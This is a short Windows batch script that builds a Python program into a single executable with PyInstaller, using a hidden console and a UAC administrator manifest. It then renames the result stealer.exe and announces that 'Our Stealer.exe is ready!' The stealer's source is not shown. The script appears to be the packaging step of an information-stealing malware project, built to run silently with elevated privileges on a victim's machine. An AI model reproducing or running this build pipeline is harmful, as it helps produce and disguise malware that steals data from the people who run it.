echo Installing PyInstaller...
pip install pyinstaller

echo Starting PyInstaller...

pyinstaller --onefile --noconsole --clean --manifest=uac_admin.manifest .\main.py

echo PyInstaller Finished!
set scriptDir=%~dp0
cd /d "%scriptDir%dist"

move main.exe ..

cd ..
echo Cleaning up...

powershell -Command "Remove-Item -Path '%scriptDir%dist' -Recurse -Force"
powershell -Command "Remove-Item -Path '%scriptDir%build' -Recurse -Force"

DEL main.spec
echo Temporary files deleted!

if exist stealer.exe (
    del stealer.exe
)

if exist main.exe (
    ren main.exe stealer.exe
) else (
    echo main.exe not found!
)

echo Our Stealer.exe is ready!

wsl bash wsl.sh